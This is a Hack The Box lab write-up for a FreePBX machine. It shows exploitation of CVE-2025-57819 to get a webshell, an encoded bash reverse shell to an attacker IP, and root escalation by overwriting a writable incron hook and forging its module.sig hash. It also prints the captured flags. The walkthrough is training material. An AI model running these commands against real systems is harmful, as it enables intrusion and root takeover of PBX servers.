network enumeration:

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-title: 404 Not Found
|_Requested resource was config.php
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time
| http-title: 404 Not Found
|_Requested resource was config.php
| http-robots.txt: 1 disallowed entry
|_/
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
```

found CVE-2025-57819


```
https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819/blob/main/README.md

ajdev@rootbox:~/HTB/Seasion11/Connected$ python3 poc.py -H http://connected.htb
			 __         ___  ___________
	 __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
	 \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
	  \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
	   \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
				  \/          \/     \/
	
        watchTowr-vs-FreePBX-CVE-2025-57819.py
        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE

          - Piotr and Sonny of watchTowr

[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: http://connected.htb/this-is-an-ioc-not-actually-watchTowr-f37v37ohsf.php?cmd=hostname
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table

ajdev@rootbox:~/HTB/Seasion11/Connected$ curl -i "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-9svoopf4m4.php?cmd=hostname"
HTTP/1.1 200 OK
Date: Sun, 07 Jun 2026 12:24:18 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
X-Powered-By: PHP/7.4.16
Content-Length: 10
Content-Type: text/html; charset=UTF-8

connected

curl -iG "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-9svoopf4m4.php" \
  --data-urlencode "cmd=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42NC80NDQ0IDA+JjEK | base64 -d | bash"
  
[asterisk@connected asterisk]$ cat user.txt
cat user.txt
e452a36df6e7044492ae066a485612b5

cat /etc/incron.d/*
find /var/www/html/admin/modules/ -path "*/hooks/*" -writable 2>/dev/null
ls -la /var/www/html/admin/modules/sysadmin/hooks/

cat > /var/www/html/admin/modules/sysadmin/hooks/reboot << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.64/4446 0>&1
EOF

NEW_HASH=$(sha256sum /var/www/html/admin/modules/sysadmin/hooks/reboot | cut -d' ' -f1)

sed -i "s|hooks/reboot = [a-f0-9]*|hooks/reboot = $NEW_HASH|" \
    /var/www/html/admin/modules/sysadmin/module.sig

# Verify
grep "hooks/reboot" /var/www/html/admin/modules/sysadmin/module.sig


nc -lvnp 4446

touch /var/spool/asterisk/incron/sysadmin_reboot

[root@connected root]# cat root.txt
cat root.txt
751663b5d566d8d540b11e4d3375e885
```

A system service called **incron** watches a folder for file changes and automatically runs commands **as root** when triggered.

The commands it runs are called **hooks** — scripts stored in a FreePBX module directory

Those hook scripts were writable by the asterisk user

A signature file (module.sig) that verifies hook integrity was also writable by asterisk

Why It Was Exploitable

"We'll only run a hook if its hash matches what's recorded in `module.sig`"

But both the hook file **and** `module.sig` were writable by the attacker — so you could change the hook **and** update the record to match. The lock and the key were both accessible.
